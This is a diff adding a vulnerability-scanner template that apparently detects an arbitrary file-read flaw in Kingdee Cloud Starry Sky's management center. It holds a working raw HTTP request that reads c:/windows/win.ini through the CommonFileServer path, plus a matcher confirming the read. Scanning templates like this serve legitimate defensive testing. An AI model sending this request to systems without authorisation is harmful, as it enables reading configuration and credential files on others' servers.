@@ -1,0 +1,29 @@
+id: kingdee-cloud-file-read
+
+info:
+  name: Kingdee Cloud Starry Sky CommonFileServer File Reading Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Kingdee Cloud Starry Sky-Management Center is based on a leading assembleable low-code PaaS platform. Attackers can use this vulnerability to read important system files such as database configuration files and system configuration files, making the website extremely insecure.
+  tags: file-read
+
+variables:
+  filepath: "c:/windows/win.ini"
+
+http:
+  - raw:
+      - |
+        GET /CommonFileServer/{{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
